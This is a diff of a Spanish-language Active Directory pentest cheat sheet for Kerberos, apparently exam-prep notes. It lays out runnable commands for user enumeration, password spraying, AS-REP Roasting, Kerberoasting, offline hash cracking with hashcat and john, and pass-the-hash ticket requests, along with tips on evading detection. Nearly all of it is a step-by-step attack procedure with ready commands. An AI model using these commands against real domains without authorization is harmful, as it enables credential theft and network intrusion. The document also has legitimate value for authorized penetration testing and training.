@@ -1,27 +1,254 @@
-	us# Kerberos 
+# Kerberos (88)
 
-Tags: #Kerberos #DC #Windows 
+Tags: #Kerberos #DC #Windows #AD #ASREPRoasting #Kerberoasting #UserEnum
 
-## Sincronizar el reloj 
+## OBJETIVO
+- Sincronizar reloj con el DC antes de cualquier ataque
+- Enumerar usuarios válidos del dominio
+- Identificar cuentas sin preautenticación (AS-REP Roasting)
+- Identificar cuentas con SPNs (Kerberoasting)
+- Obtener hashes crackeables offline
 
-```bash 
-Nota: Antes de iniciar al ataque debemos de sincronizar el reloj de la maquina de atacante con el AD
+## TIPS
+1. **Sincronizar reloj SIEMPRE antes de cualquier ataque → si difiere más de 5 min, todo falla con KRB_AP_ERR_SKEW**
+2. **AS-REP Roasting → no necesitas creds → pruébalo siempre primero**
+3. **Kerberoasting → necesitas solo una cuenta de dominio válida → cualquiera sirve**
+4. **Si obtienes un hash → intenta crackearlo Y guárdalo aunque no crackee ahora**
+5. **kerbrute es más sigiloso que LDAP/RPC para enumerar usuarios**
 
-❯ ntpdate IP_DC     # Sincronizar el reloj con el DC 
+## TOOLS
+* [Kerbrute](https://github.com/ropnop/kerbrute)
+* [Impacket](https://github.com/fortra/impacket)
+* [Hashcat](https://hashcat.net/hashcat/)
+* [John the Ripper](https://github.com/openwall/john)
+* [CrackStation](https://crackstation.net/)
+* [Hashes.com](https://hashes.com/en/decrypt/hash)
 
-❯ date -s "2025-01-04 15:30:00"   # Restablecer la fecha y hora
+---
+
+## 0. SINCRONIZACIÓN DE RELOJ (OBLIGATORIO)
+
+```bash
+# Kerberos requiere que el reloj del atacante no difiera más de 5 minutos del DC
+# Si no sincronizas → KRB_AP_ERR_SKEW → todos los ataques fallan
+
+❯ sudo ntpdate <IP_DC>
+# Sincronizar automáticamente con el DC
+# Requiere: acceso al DC
+
+❯ sudo ntpdate -u <IP_DC>
+# Forzar sincronización ignorando si NTP ya está corriendo
+
+❯ sudo rdate -n <IP_DC>
+# Alternativa si ntpdate no está disponible
+
+❯ sudo timedatectl set-ntp false
+❯ sudo timedatectl set-time "YYYY-MM-DD HH:MM:SS"
+# Ajuste manual como último recurso
+
+❯ date
+# Verificar que la hora quedó correcta después de sincronizar
+
+❯ date -s "2025-01-04 15:30:00"   
+# Restablecer la fecha y hora
 ```
 
-## Kerbrute 
+### Insight importante
+- **Sin sincronización → ningún ataque Kerberos funcionará**
+- En el examen esto se olvida frecuentemente → ponlo como primer paso del checklist
+- Si un ataque falla misteriosamente → revisar el reloj primero
 
-```bash 
-❯ git clone https://github.com/ropnop/kerbrute           # Descargar la herramienta
-❯ go build .                                             # Entrar al dir 'kerbrute' y compilarlo 
+---
+
+## 1. ENUMERACIÓN DE USUARIOS (SIN CREDENCIALES)
+
+```bash
+❯ kerbrute userenum -d domain.corp --dc <IP> users.txt
+# No requiere creds → valida usuarios contra el DC directamente vía Kerberos
+# Más sigiloso que LDAP o RPC para enumerar usuarios
+
+❯ kerbrute userenum --dc <IP> -d domain.corp \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+# Wordlist grande → útil cuando no tienes ningún usuario conocido de partida
+
+❯ kerbrute userenum --dc <IP> -d domain.corp users.txt -o valid_users.txt
+# Guardar usuarios válidos a archivo → úsalo directamente en AS-REP Roasting
 ```
 
-```bash 
-❯ kerbrute userenum -d domain1.corp --dc IP user.txt     # Enumerar usuarios validos en el DC 
+### Insight
+- Kerberos responde diferente ante usuarios válidos e inválidos → eso es lo que kerbrute aprovecha
+- La lista de válidos que obtienes aquí → alimenta directamente AS-REP Roasting
+- Revisa la política de lockout antes de usar wordlists grandes
 
-# Ataque de diccionario para encontrar usuarios validos en el DC
-❯ kerbrute userenum --dc IP -d domain1.corp /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt 
+---
+
+## 2. PASSWORD SPRAYING VÍA KERBEROS (SIN / CON CREDS)
+
+```bash
+❯ kerbrute passwordspray -d domain.corp --dc <IP> valid_users.txt 'Password123'
+# No requiere creds previas → prueba una sola clave contra todos los usuarios
+# Más sigiloso que spraying por SMB → menos logs generados
+# Cuidado: puede bloquear cuentas si hay lockout policy activa
+
+❯ kerbrute bruteuser -d domain.corp --dc <IP> administrator passwords.txt
+# Fuerza bruta a un usuario específico
+# Solo úsalo si sabes que no hay lockout policy
 ```
+
+### Condiciones clave
+- Lockout policy → **máximo 1 password por usuario por spray**
+- Sin lockout → puedes ser más agresivo pero igual va despacio
+- Si consigues creds → ve a SMB/WinRM/RDP a validarlas
+
+---
+
+## 3. AS-REP ROASTING (SIN CREDENCIALES)
+
+```bash
+# Ataca cuentas que tienen "Do not require Kerberos preauthentication" activado
+# El DC responde con un TGT parcialmente cifrado con la clave del usuario
+# Ese cifrado es crackeable offline → no necesitas interactuar más con el DC
+# No requiere credenciales → solo una lista de usuarios válidos
+
+❯ impacket-GetNPUsers domain.corp/ -no-pass -usersfile valid_users.txt -dc-ip <IP>
+# No requiere creds → prueba todos los usuarios de la lista
+# Devuelve hashes AS-REP de cuentas vulnerables
+
+❯ impacket-GetNPUsers domain.corp/ -no-pass \
+  -usersfile valid_users.txt -dc-ip <IP> -outputfile asrep_hashes.txt
+# Igual pero guarda los hashes directamente a archivo para crackear
+
+❯ impacket-GetNPUsers domain.corp/ -no-pass -dc-ip <IP> -request
+# Sin lista de usuarios → intenta con null session
+# Funciona solo si el DC permite null session (poco común en entornos modernos)
+
+❯ impacket-GetNPUsers domain.corp/'user':'pass' -dc-ip <IP> -request
+# Con credenciales válidas → enumera TODOS los usuarios vulnerables del dominio
+# Más completo que sin creds → úsalo si ya tienes una cuenta
+
+❯ impacket-GetNPUsers domain.corp/'user':'pass' \
+  -dc-ip <IP> -request -outputfile asrep_hashes.txt
+# Con creds y guardando hashes → la forma más completa
+
+❯ nxc ldap <IP> -u 'user' -p 'pass' --asreproast asrep_hashes.txt
+# Alternativa con netexec → requiere creds válidas
+# Más rápido en dominios grandes con muchos usuarios
+```
+
+### Crackeo de hashes AS-REP
+
+```bash
+# El hash tiene formato $krb5asrep$23$...
+
+❯ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+# Modo 18200 → AS-REP Roasting
+# Sin GPU → agrega --force
+
+❯ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+# Con reglas → más probabilidad de crackear contraseñas complejas
+
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
+# Alternativa con John si no tienes hashcat
+```
+
+### Insight
+- Si crackeas → tienes credenciales en claro → vuelve a SMB / WinRM / RDP con ellas
+- Si no crackeas → guarda el hash para intentar con wordlists más grandes después
+- Cuentas de servicio configuradas mal son el objetivo más frecuente
+
+---
+
+## 4. KERBEROASTING (CON CREDENCIALES)
+
+```bash
+# Ataca cuentas de servicio que tienen SPNs registrados en el dominio
+# Solicitas un TGS para ese servicio → viene cifrado con la clave de la cuenta
+# Ese cifrado es crackeable offline
+# Requiere: cualquier cuenta de dominio válida → no necesitas ser admin
+
+❯ impacket-GetUserSPNs domain.corp/'user':'pass' -dc-ip <IP>
+# Requiere creds válidas → lista todas las cuentas con SPNs
+# Solo lista, no solicita tickets todavía
+
+❯ impacket-GetUserSPNs domain.corp/'user':'pass' -dc-ip <IP> -request
+# Requiere creds válidas → solicita y devuelve tickets TGS crackeables
+
+❯ impacket-GetUserSPNs domain.corp/'user':'pass' \
+  -dc-ip <IP> -request -outputfile kerberoast_hashes.txt
+# Guarda hashes a archivo directamente → listo para crackear
+
+❯ impacket-GetUserSPNs domain.corp/'user':'pass' \
+  -dc-ip <IP> -request -target-domain domain.corp
+# Especificar dominio explícitamente → útil en entornos multi-dominio
+
+❯ nxc ldap <IP> -u 'user' -p 'pass' --kerberoasting kerb_hashes.txt
+# Alternativa con netexec → más rápido en dominios grandes
+```
+
+### Crackeo de hashes Kerberoast
+
+```bash
+# El hash tiene formato $krb5tgs$23$...
+
+❯ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+# Modo 13100 → Kerberoasting RC4 (más común)
+
+❯ hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+# Modo 19700 → Kerberoasting AES256 (más lento)
+
+❯ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+# Con reglas → más probabilidad de crackear
+
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
+# Alternativa con John
+```
+
+### Insight
+- Cuentas de servicio suelen tener contraseñas débiles → alta tasa de crackeo
+- Si crackeas → tienes creds de cuenta de servicio → valida en SMB / WinRM
+- Prioriza cuentas que estén en grupos privilegiados (revisa con BloodHound)
+- RC4 (tipo 23) → más fácil de crackear que AES → si ves AES intenta forzar RC4
+
+---
+
+## 5. SOLICITAR TGT (CON CREDENCIALES O HASH)
+
+```bash
+# Obtener un ticket TGT desde Linux para usarlo en herramientas Kerberos
+# Interactúa directamente con el puerto 88
+
+❯ impacket-getTGT domain.corp/'user':'pass' -dc-ip <IP>
+# Requiere creds válidas → genera archivo user.ccache en el directorio actual
+
+❯ impacket-getTGT domain.corp/'user' -hashes :NThash -dc-ip <IP>
+# Requiere NT hash → genera ticket sin necesitar password en claro
+# Útil cuando tienes el hash pero no crackeaste la contraseña
+
+❯ export KRB5CCNAME=user.ccache
+# Activar el ticket → todas las herramientas de impacket lo usarán automáticamente
+
+❯ klist
+# Verificar que el ticket está activo y ver su expiración
+```
+
+### Insight
+- Un TGT dura ~10 horas → suficiente para el examen
+- KRB5CCNAME → variable que conecta este ticket con herramientas de lateral movement
+- El uso del ticket en sí (psexec -k, wmiexec -k) va en las notas de lateral movement
+
+---
+
+## CONDICIONES CLAVE
+- Sin creds → enum usuarios + AS-REP Roasting
+- Creds válidas → Kerberoasting + getTGT
+- Hash NT → getTGT sin contraseña en claro
+- Hash crackeado → reutilizar en SMB / WinRM / RDP
+
+## ONE-LINERS MENTALES
+- Puerto 88 abierto → sincronizar reloj PRIMERO siempre
+- Sin creds → kerbrute para usuarios → AS-REP Roasting con esa lista
+- Creds válidas → Kerberoasting inmediato
+- Hash obtenido → crackear con hashcat -m 18200 o -m 13100
+- Hash crackeado → volver a SMB y probar en todo
